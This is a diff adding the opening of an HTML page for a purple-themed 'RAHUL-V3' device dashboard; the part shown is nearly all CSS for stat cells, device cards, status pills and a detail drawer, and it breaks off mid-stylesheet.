@@ -1,0 +1,3914 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <meta name="theme-color" content="#7e22ce">
+    <title>🌌 RAHUL-V3 — JACK Ka Dashboard</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Orbitron:wght@600;700;800;900&family=Cinzel:wght@700;800;900&family=Rajdhani:wght@600;700&family=JetBrains+Mono:wght@500;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        :root {
+            /* ── MIDNIGHT DASHBOARD: DEEP BLACK + PURPLE ACCENTS ── */
+            --bg: #06040a;
+            --bg-2: #0d0918;
+            --bg-3: #160f26;
+            --card: rgba(18, 12, 33, 0.88);
+            --card-2: rgba(26, 18, 46, 0.92);
+            --card-hover: rgba(38, 26, 66, 0.96);
+
+            --primary: #a855f7;
+            --primary-dark: #7e22ce;
+            --primary-light: #c084fc;
+
+            --midnight-black: #06040a;
+            --midnight-surface: #0d0918;
+            --midnight-purple: #9333ea;
+            --electric-violet: #a855f7;
+            --neon-purple: #c084fc;
+            --glow-purple: #d946ef;
+            --sparkle-gold: #fbbf24;
+
+            --dragon-blue: #a855f7;
+            --dragon-cyan: #c084fc;
+            --dragon-ice: #f3e8ff;
+            --dragon-gold: #fbbf24;
+            --dragon-amber: #f59e0b;
+            --dragon-eye: #10b981;
+            --dragon-purple: #9333ea;
+
+            --red: #f43f5e;
+            --yellow: #fbbf24;
+            --yellow-dark: #d97706;
+            --green: #10b981;
+            --blue: #a855f7;
+            --blue-dark: #7e22ce;
+            --blue-light: #c084fc;
+
+            --text: #f8fafc;
+            --text-dim: #cbd5e1;
+            --gray: #94a3b8;
+
+            --outline: #2c1a45;
+            --outline-bright: rgba(168, 85, 247, 0.55);
+            --dragon-glow: 0 0 25px rgba(168, 85, 247, 0.5);
+            --fire-glow: 0 0 35px rgba(217, 70, 239, 0.55);
+            --ease-spring: cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        html {
+            scroll-behavior: smooth;
+            overflow-x: hidden;
+            overflow-y: auto !important;
+            width: 100%;
+            min-height: 100%;
+            -webkit-text-size-adjust: 100%;
+            -webkit-tap-highlight-color: transparent;
+            background-color: var(--bg);
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            width: 100%;
+            min-height: 100vh;
+            overflow-x: hidden;
+            overflow-y: visible !important;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-size: 15px;
+            font-weight: 600;
+            line-height: 1.4;
+            -webkit-overflow-scrolling: touch;
+            background-image:
+                radial-gradient(circle at 50% 0%, rgba(168, 85, 247, 0.18) 0%, transparent 60%),
+                radial-gradient(circle at 10% 40%, rgba(126, 34, 206, 0.12) 0%, transparent 50%),
+                radial-gradient(circle at 90% 70%, rgba(192, 132, 252, 0.1) 0%, transparent 50%),
+                linear-gradient(180deg, rgba(6, 4, 10, 0.94) 0%, rgba(3, 2, 6, 0.98) 100%);
+            background-size: cover;
+            background-position: center top;
+            background-attachment: fixed;
+        }
+
+        body.modal-open {
+            overflow: hidden !important;
+        }
+
+        button,
+        .dora-btn,
+        .statcell,
+        .icon-act,
+        .dev-num-badge,
+        .ping-pill {
+            touch-action: manipulation;
+        }
+
+        /* ============ APP ============ */
+        #app {
+            display: block;
+            width: 100%;
+            min-height: 100vh;
+            padding-bottom: 120px;
+        }
+
+        .src-badge {
+            display: inline-block;
+            padding: 2px 8px;
+            font-size: 10px;
+            font-weight: 800;
+            font-family: 'Orbitron', sans-serif;
+            border-radius: 6px;
+            background: rgba(168, 85, 247, 0.18);
+            color: var(--primary-light);
+            border: 1.5px solid rgba(168, 85, 247, 0.5);
+            margin-left: 6px;
+            letter-spacing: 0.8px;
+            vertical-align: middle;
+            text-shadow: 0 0 8px rgba(168, 85, 247, 0.6);
+        }
+
+        /* ============ TOPBAR (BLUE DRAGON COMMAND) ============ */
+        .topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 18px;
+            background: linear-gradient(180deg, rgba(18, 12, 33, 0.98) 0%, rgba(9, 6, 17, 0.98) 100%);
+            border-bottom: 3.5px solid var(--primary);
+            box-shadow: 0 4px 25px rgba(168, 85, 247, 0.45), 0 0 15px rgba(147, 51, 234, 0.25);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+        }
+
+        .topbar .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .topbar .brand-icon {
+            width: 46px;
+            height: 46px;
+            flex-shrink: 0;
+            filter: drop-shadow(0 0 10px rgba(168, 85, 247, 0.7));
+            transition: transform 0.2s var(--ease-spring);
+        }
+
+        .topbar .brand-icon:hover {
+            transform: scale(1.08) rotate(-4deg);
+        }
+
+        .topbar .brand-text {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.1;
+        }
+
+        .topbar .brand-name {
+            font-family: 'Cinzel', serif;
+            font-size: 21px;
+            font-weight: 900;
+            color: #ffffff;
+            letter-spacing: 2px;
+            background: linear-gradient(180deg, #ffffff 0%, #e9d5ff 45%, #a855f7 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 12px rgba(168, 85, 247, 0.85));
+            text-transform: uppercase;
+        }
+
+        .topbar .brand-tag {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 9.5px;
+            font-weight: 800;
+            color: var(--dragon-gold);
+            letter-spacing: 2.5px;
+            margin-top: 3px;
+            text-shadow: 0 0 10px rgba(255, 209, 102, 0.8);
+            text-transform: uppercase;
+        }
+
+        .topbar .lock-btn {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #a855f7 0%, #7e22ce 100%);
+            border: 2.5px solid var(--dragon-gold);
+            color: #ffffff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 19px;
+            box-shadow: 0 0 16px rgba(168, 85, 247, 0.7), inset 0 0 8px rgba(255, 255, 255, 0.4);
+            transition: transform 0.15s var(--ease-spring), box-shadow 0.15s;
+        }
+
+        .topbar .lock-btn:hover {
+            transform: rotate(180deg) scale(1.08);
+            box-shadow: 0 0 25px rgba(192, 132, 252, 0.9);
+        }
+
+        .topbar .lock-btn:active {
+            transform: scale(0.92);
+            box-shadow: 0 0 8px rgba(168, 85, 247, 0.5);
+        }
+
+        /* ============ STATS BAR (BLUE OBSIDIAN PLATES) ============ */
+        .statbar {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            padding: 14px 14px;
+            background: transparent;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .statcell {
+            background: linear-gradient(160deg, rgba(18, 12, 33, 0.95) 0%, rgba(8, 5, 15, 0.98) 100%);
+            border: 2.5px solid rgba(168, 85, 247, 0.35);
+            border-radius: 16px;
+            padding: 12px 6px;
+            text-align: center;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.8), 0 0 12px rgba(168, 85, 247, 0.12);
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.15s var(--ease-spring), box-shadow 0.15s var(--ease-spring), border-color 0.15s;
+            min-width: 0;
+            box-sizing: border-box;
+            backdrop-filter: blur(10px);
+        }
+
+        .statcell::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, rgba(168, 85, 247, 0.8), transparent);
+        }
+
+        .statcell:hover {
+            transform: translateY(-2px);
+            border-color: var(--primary);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.9), 0 0 20px rgba(168, 85, 247, 0.45);
+        }
+
+        .statcell:active {
+            transform: scale(0.97) translate(1px, 1px);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.8);
+        }
+
+        .statcell .k {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 10px;
+            font-weight: 800;
+            color: var(--text-dim);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+
+        .statcell .v {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            line-height: 1.1;
+            font-weight: 900;
+        }
+
+        .statcell .ico {
+            position: absolute;
+            top: 6px;
+            right: 7px;
+            font-size: 14px;
+            filter: drop-shadow(0 0 6px rgba(168, 85, 247, 0.6));
+            opacity: 0.9;
+        }
+
+        .statcell.total {
+            border-color: rgba(168, 85, 247, 0.4);
+        }
+
+        .statcell.total .v {
+            color: var(--dragon-blue);
+            text-shadow: 0 0 15px rgba(168, 85, 247, 0.7);
+        }
+
+        .statcell.live-ping {
+            border-color: rgba(0, 245, 212, 0.4);
+        }
+
+        .statcell.live-ping .v {
+            color: var(--dragon-eye);
+            text-shadow: 0 0 15px rgba(0, 245, 212, 0.8);
+        }
+
+        .statcell.online {
+            border-color: rgba(16, 185, 129, 0.4);
+        }
+
+        .statcell.online .v {
+            color: #10b981;
+            text-shadow: 0 0 15px rgba(16, 185, 129, 0.7);
+        }
+
+        .statcell.offline {
+            border-color: rgba(244, 63, 94, 0.4);
+        }
+
+        .statcell.offline .v {
+            color: #f43f5e;
+            text-shadow: 0 0 15px rgba(244, 63, 94, 0.8);
+        }
+
+        .statcell.bank {
+            border-color: rgba(255, 209, 102, 0.4);
+        }
+
+        .statcell.bank .v {
+            color: var(--dragon-gold);
+            text-shadow: 0 0 15px rgba(255, 209, 102, 0.7);
+        }
+
+        /* ============ CONTROLS (TACTICAL BATTLE BUTTONS) ============ */
+        .controls {
+            padding: 4px 14px 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .btn-row {
+            display: flex;
+            gap: 10px;
+            width: 100%;
+            flex-wrap: wrap;
+            box-sizing: border-box;
+        }
+
+        .dora-btn {
+            flex: 1 1 0;
+            min-width: 0;
+            padding: 12px 10px;
+            background: var(--card);
+            border: 2.5px solid rgba(168, 85, 247, 0.35);
+            border-radius: 14px;
+            color: var(--text);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11.5px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.7), 0 0 10px rgba(168, 85, 247, 0.1);
+            transition: transform 0.12s var(--ease-spring), box-shadow 0.12s var(--ease-spring), border-color 0.12s;
+            white-space: nowrap;
+            box-sizing: border-box;
+            text-transform: uppercase;
+        }
+
+        .dora-btn .ico {
+            font-size: 15px;
+            filter: drop-shadow(0 0 6px currentColor);
+        }
+
+        .dora-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.85), 0 0 18px rgba(168, 85, 247, 0.45);
+            border-color: var(--primary);
+        }
+
+        .dora-btn:active {
+            transform: scale(0.96) translate(1px, 1px);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.8);
+        }
+
+        /* BLUE DRAGON BUTTON */
+        .dora-btn.blue {
+            background: linear-gradient(135deg, #a855f7 0%, #581c87 100%);
+            border-color: #d8b4fe;
+            color: #ffffff;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.6);
+            box-shadow: 0 4px 18px rgba(168, 85, 247, 0.45);
+        }
+
+        .dora-btn.blue:hover {
+            box-shadow: 0 6px 25px rgba(168, 85, 247, 0.7);
+        }
+
+        /* ELECTRIC PLASMA GREEN BUTTON */
+        .dora-btn.green {
+            background: linear-gradient(135deg, #00f5d4 0%, #006b52 100%);
+            border-color: #5eead4;
+            color: #001f18;
+            text-shadow: 0 1px 0 rgba(255, 255, 255, 0.3);
+            box-shadow: 0 4px 18px rgba(0, 245, 212, 0.45);
+        }
+
+        .dora-btn.green:hover {
+            box-shadow: 0 6px 25px rgba(0, 245, 212, 0.7);
+        }
+
+        /* LIGHTNING GOLD DRAGON BUTTON */
+        .dora-btn.yellow {
+            background: linear-gradient(135deg, #ffd166 0%, #b37400 100%);
+            border-color: #fde047;
+            color: #1a0f00;
+            text-shadow: 0 1px 0 rgba(255, 255, 255, 0.4);
+            box-shadow: 0 4px 18px rgba(255, 209, 102, 0.45);
+        }
+
+        .dora-btn.yellow:hover {
+            box-shadow: 0 6px 25px rgba(255, 209, 102, 0.7);
+        }
+
+        /* FROSTFIRE RED BUTTON */
+        .dora-btn.red {
+            background: linear-gradient(135deg, #f43f5e 0%, #881337 100%);
+            border-color: #fda4af;
+            color: #ffffff;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.6);
+            box-shadow: 0 4px 18px rgba(244, 63, 94, 0.45);
+        }
+
+        .dora-btn.red:hover {
+            box-shadow: 0 6px 25px rgba(244, 63, 94, 0.7);
+        }
+
+        /* TACTICAL DRAGON NUMBER BADGE */
+        .dev-num-badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #a855f7 0%, #7e22ce 100%);
+            color: #06040a;
+            border: 2px solid #d8b4fe;
+            border-radius: 9px;
+            padding: 2px 8px;
+            font-size: 11px;
+            font-weight: 900;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 0.5px;
+            box-shadow: 0 0 12px rgba(168, 85, 247, 0.6);
+            vertical-align: middle;
+            cursor: pointer;
+            transition: transform 0.12s var(--ease-spring), box-shadow 0.12s;
+            user-select: none;
+        }
+
+        .dev-num-badge:hover {
+            transform: scale(1.1) translateY(-1px);
+            box-shadow: 0 0 18px rgba(168, 85, 247, 0.9);
+        }
+
+        .dev-num-badge:active {
+            transform: scale(0.95);
+        }
+
+        /* PING RADAR PILL */
+        .ping-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 3px 10px;
+            border-radius: 12px;
+            border: 2px solid var(--outline);
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 800;
+            font-size: 10.5px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .ping-pill.live {
+            background: rgba(0, 245, 212, 0.15);
+            color: var(--dragon-eye);
+            border-color: var(--dragon-eye);
+            box-shadow: 0 0 12px rgba(0, 245, 212, 0.4);
+        }
+
+        .ping-pill.idle {
+            background: rgba(255, 209, 102, 0.15);
+            color: var(--dragon-gold);
+            border-color: var(--dragon-gold);
+        }
+
+        .ping-pill.dead {
+            background: rgba(15, 23, 42, 0.6);
+            color: var(--gray);
+            border-color: #1e293b;
+        }
+
+        .ping-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: currentColor;
+            box-shadow: 0 0 8px currentColor;
+            animation: dotPulse 1.2s infinite;
+        }
+
+        .ping-pill.dead .ping-dot {
+            animation: none;
+            opacity: 0.4;
+            box-shadow: none;
+        }
+
+        .ping-banner {
+            background: linear-gradient(135deg, rgba(168, 85, 247, 0.18) 0%, rgba(0, 119, 182, 0.25) 100%);
+            border: 2.5px solid var(--primary);
+            border-radius: 16px;
+            padding: 12px 18px;
+            margin-bottom: 14px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12.5px;
+            font-weight: 800;
+            color: var(--primary);
+            box-shadow: 0 4px 20px rgba(168, 85, 247, 0.25);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .ping-banner button {
+            padding: 7px 16px;
+            border-radius: 12px;
+            border: 2px solid var(--primary);
+            background: var(--card);
+            color: var(--primary);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11px;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(168, 85, 247, 0.3);
+            transition: all 0.12s;
+        }
+
+        .ping-banner button:hover {
+            background: var(--primary);
+            color: #000;
+        }
+
+        /* SEARCH INPUT */
+        .search-wrap {
+            position: relative;
+            width: 100%;
+        }
+
+        .search-wrap input {
+            width: 100%;
+            padding: 13px 18px 13px 48px;
+            background: rgba(14, 9, 26, 0.95);
+            border: 2.5px solid rgba(168, 85, 247, 0.35);
+            border-radius: 16px;
+            color: #ffffff;
+            font-size: 14.5px;
+            font-weight: 700;
+            font-family: 'Rajdhani', sans-serif;
+            outline: none;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.7);
+            transition: all 0.15s var(--ease-spring);
+        }
+
+        .search-wrap input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 25px rgba(168, 85, 247, 0.6), inset 0 0 10px rgba(168, 85, 247, 0.2);
+        }
+
+        .search-wrap input::placeholder {
+            color: var(--gray);
+            font-family: 'Rajdhani', sans-serif;
+        }
+
+        .search-wrap::before {
+            content: "🐉";
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 18px;
+            pointer-events: none;
+        }
+
+        /* ============ FILTERBAR ============ */
+        .filterbar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 4px 14px 14px;
+            overflow-x: auto;
+        }
+
+        .filterbar::-webkit-scrollbar {
+            display: none;
+        }
+
+        .filterbar button {
+            padding: 9px 15px;
+            background: rgba(16, 11, 29, 0.9);
+            border: 2px solid rgba(168, 85, 247, 0.3);
+            border-radius: 14px;
+            color: var(--text-dim);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11px;
+            font-weight: 800;
+            cursor: pointer;
+            white-space: nowrap;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.6);
+            transition: all 0.12s;
+            flex-shrink: 0;
+            text-transform: uppercase;
+        }
+
+        .filterbar button:hover {
+            border-color: var(--primary);
+            color: #ffffff;
+            box-shadow: 0 0 12px rgba(168, 85, 247, 0.4);
+        }
+
+        .filterbar button.active {
+            background: linear-gradient(135deg, #a855f7 0%, #7e22ce 100%);
+            color: #ffffff;
+            border-color: var(--dragon-gold);
+            box-shadow: 0 0 18px rgba(168, 85, 247, 0.7);
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.6);
+        }
+
+        .filterbar .sel {
+            padding: 9px 14px;
+            background: rgba(16, 11, 29, 0.9);
+            border: 2px solid rgba(168, 85, 247, 0.35);
+            border-radius: 14px;
+            color: var(--dragon-gold);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11px;
+            font-weight: 800;
+            cursor: pointer;
+            outline: none;
+            flex-shrink: 0;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.6);
+        }
+
+        .filterbar .sel:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 15px rgba(168, 85, 247, 0.5);
+        }
+
+        /* ============ GRID & DEVICE CARDS ============ */
+        .grid-wrap {
+            padding: 0 14px;
+        }
+
+        .device-list {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .device-card {
+            background: linear-gradient(150deg, rgba(18, 12, 33, 0.96) 0%, rgba(8, 5, 15, 0.98) 100%);
+            border: 2.5px solid rgba(168, 85, 247, 0.35);
+            border-radius: 20px;
+            padding: 16px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.8), 0 0 15px rgba(168, 85, 247, 0.1);
+            transition: transform 0.16s var(--ease-spring), box-shadow 0.16s var(--ease-spring), border-color 0.16s;
+            animation: cardIn 0.35s cubic-bezier(0.16, 1, 0.3, 1) backwards;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(8px);
+        }
+
+        .device-card::before {
+            content: "";
+            position: absolute;
+            top: -20px;
+            right: -20px;
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(168, 85, 247, 0.2), transparent 70%);
+            pointer-events: none;
+        }
+
+        @keyframes cardIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px) scale(0.95);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .device-card:hover {
+            transform: translateY(-3px);
+            border-color: var(--primary);
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.9), 0 0 25px rgba(168, 85, 247, 0.45);
+        }
+
+        .device-card:active {
+            transform: scale(0.985) translate(1px, 1px);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.8);
+        }
+
+        .device-card.blacklisted {
+            opacity: 0.4;
+            border-style: dashed;
+            border-color: #555;
+        }
+
+        .device-card .card-header {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .device-card .avatar {
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            border: 2.5px solid var(--dragon-gold);
+            flex-shrink: 0;
+            background: linear-gradient(135deg, #a855f7 0%, #7e22ce 50%, #06040a 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 16px rgba(168, 85, 247, 0.7), inset 0 0 8px rgba(255, 255, 255, 0.4);
+            overflow: hidden;
+            transition: transform 0.15s var(--ease-spring);
+        }
+
+        .device-card:hover .avatar {
+            transform: rotate(-8deg) scale(1.08);
+        }
+
+        .device-card .avatar svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .device-card .info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .device-card .device-name {
+            font-family: 'Orbitron', 'Rajdhani', sans-serif;
+            font-size: 16px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 5px;
+            word-break: break-word;
+            line-height: 1.25;
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 5px;
+            text-shadow: 0 0 10px rgba(168, 85, 247, 0.35);
+        }
+
+        .device-card .field {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 13.5px;
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 3px;
+            display: flex;
+            gap: 6px;
+            align-items: baseline;
+            line-height: 1.35;
+        }
+
+        .device-card .field .k {
+            color: var(--text-dim);
+            flex-shrink: 0;
+            font-weight: 800;
+            font-size: 11.5px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .device-card .field .v {
+            color: var(--text);
+            word-break: break-all;
+        }
+
+        .device-card .field .v.mono {
+            font-family: 'Courier New', monospace;
+            font-size: 12.5px;
+            font-weight: 800;
+            color: #ffffff;
+        }
+
+        .device-card .field .v.bat-green {
+            color: var(--dragon-eye);
+            font-weight: 800;
+            text-shadow: 0 0 8px rgba(0, 245, 212, 0.6);
+        }
+
+        .device-card .field .v.bat-yellow {
+            color: var(--dragon-gold);
+            font-weight: 800;
+            text-shadow: 0 0 8px rgba(255, 209, 102, 0.6);
+        }
+
+        .device-card .field .v.bat-red {
+            color: #f43f5e;
+            font-weight: 800;
+            text-shadow: 0 0 8px rgba(244, 63, 94, 0.6);
+        }
+
+        .device-card .card-footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 12px;
+            padding-top: 10px;
+            border-top: 2px dashed rgba(168, 85, 247, 0.25);
+        }
+
+        .device-card .status {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 5px 12px;
+            border-radius: 14px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 10px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            border: 2px solid var(--outline);
+        }
+
+        .device-card .status .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: currentColor;
+            box-shadow: 0 0 8px currentColor;
+            animation: dotPulse 1.6s infinite;
+        }
+
+        @keyframes dotPulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.35;
+            }
+        }
+
+        .device-card .status.on {
+            background: rgba(0, 245, 212, 0.15);
+            color: var(--dragon-eye);
+            border-color: var(--dragon-eye);
+            box-shadow: 0 0 12px rgba(0, 245, 212, 0.35);
+        }
+
+        .device-card .status.off {
+            background: rgba(244, 63, 94, 0.15);
+            color: #f43f5e;
+            border-color: #f43f5e;
+            box-shadow: 0 0 10px rgba(244, 63, 94, 0.3);
+        }
+
+        .device-card .status.off .dot {
+            animation: none;
+            opacity: 0.6;
+        }
+
+        .device-card .actions {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .device-card .icon-act {
+            width: 38px;
+            height: 38px;
+            border-radius: 12px;
+            background: rgba(18, 12, 33, 0.95);
+            border: 2px solid rgba(168, 85, 247, 0.35);
+            color: var(--text);
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.6);
+            transition: transform 0.12s var(--ease-spring), box-shadow 0.12s var(--ease-spring), border-color 0.12s;
+        }
+
+        .device-card .icon-act:hover {
+            transform: translateY(-2px);
+            border-color: var(--primary);
+            box-shadow: 0 0 15px rgba(168, 85, 247, 0.5);
+            color: #ffffff;
+        }
+
+        .device-card .icon-act:active {
+            transform: scale(0.92);
+        }
+
+        .device-card .icon-act.star.active {
+            background: linear-gradient(135deg, #ffd166, #fca311);
+            color: #000;
+            border-color: #ffd166;
+            box-shadow: 0 0 15px rgba(255, 209, 102, 0.7);
+        }
+
+        .device-card .icon-act.trash:hover {
+            background: rgba(244, 63, 94, 0.35);
+            border-color: #f43f5e;
+        }
+
+        /* ============ EMPTY / LOADING ============ */
+        .center-box {
+            text-align: center;
+            padding: 50px 20px;
+        }
+
+        .center-box .dora-spin {
+            width: 76px;
+            height: 76px;
+            margin: 0 auto 18px;
+            filter: drop-shadow(0 0 20px rgba(168, 85, 247, 0.8));
+            animation: blueDragonPulse 1.8s ease-in-out infinite;
+        }
+
+        @keyframes blueDragonPulse {
+
+            0%,
+            100% {
+                transform: scale(1) rotate(0deg);
+            }
+
+            50% {
+                transform: scale(1.12) rotate(6deg);
+            }
+        }
+
+        .center-box .t {
+            font-family: 'Cinzel', serif;
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--primary-light);
+            letter-spacing: 1.5px;
+            text-shadow: 0 0 15px rgba(168, 85, 247, 0.6);
+            text-transform: uppercase;
+        }
+
+        .center-box .sub {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-dim);
+            margin-top: 6px;
+        }
+
+        /* ============ FAB (BLUE DRAGON CORE ORB) ============ */
+        .fab {
+            position: fixed;
+            bottom: 22px;
+            right: 20px;
+            width: 58px;
+            height: 58px;
+            border-radius: 50%;
+            background: linear-gradient(145deg, #a855f7, #581c87);
+            border: 3px solid var(--dragon-gold);
+            color: #ffffff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            box-shadow: 0 0 25px rgba(168, 85, 247, 0.8), 0 0 50px rgba(147, 51, 234, 0.4);
+            z-index: 500;
+            transition: transform 0.15s var(--ease-spring), box-shadow 0.15s;
+            animation: blueFlamePulse 2.2s ease-in-out infinite;
+        }
+
+        @keyframes blueFlamePulse {
+
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+                box-shadow: 0 0 25px rgba(168, 85, 247, 0.8);
+            }
+
+            50% {
+                transform: translateY(-6px) scale(1.06);
+                box-shadow: 0 0 35px rgba(192, 132, 252, 0.95);
+            }
+        }
+
+        .fab:hover {
+            transform: scale(1.12) rotate(15deg);
+            box-shadow: 0 0 40px rgba(168, 85, 247, 1);
+        }
+
+        .fab:active {
+            transform: scale(0.92);
+            animation: none;
+        }
+
+        /* ============ DETAIL PANEL (OBSIDIAN ICE DRAWER) ============ */
+        .doverlay {
+            position: fixed;
+            inset: 0;
+            z-index: 1000;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            display: flex;
+            justify-content: flex-end;
+            animation: fadeIn 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+            overscroll-behavior: contain;
+            touch-action: none;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .dpanel {
+            width: 100%;
+            max-width: 530px;
+            height: 100%;
+            background: #06040a;
+            border-left: 3.5px solid var(--primary);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            animation: slideIn 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            overscroll-behavior: contain;
+            touch-action: pan-y;
+            box-shadow: -15px 0 50px rgba(0, 0, 0, 0.95), 0 0 35px rgba(168, 85, 247, 0.4);
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(50px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .dhead {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 20px;
+            background: linear-gradient(180deg, #1a1030 0%, #0a0614 100%);
+            border-bottom: 3.5px solid var(--primary);
+            gap: 12px;
+            flex-shrink: 0;
+            color: #fff;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.8);
+        }
+
+        .dhead .dinfo {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .dhead .dname {
+            font-family: 'Cinzel', serif;
+            font-size: 19px;
+            font-weight: 900;
+            color: #fff;
+            letter-spacing: 1px;
+            text-shadow: 0 0 15px rgba(168, 85, 247, 0.8);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            text-transform: uppercase;
+        }
+
+        .dhead .dstat {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11px;
+            font-weight: 800;
+            margin-top: 4px;
+        }
+
+        .dhead .dstat .dot {
+            width: 8px;
+            height: 8px;
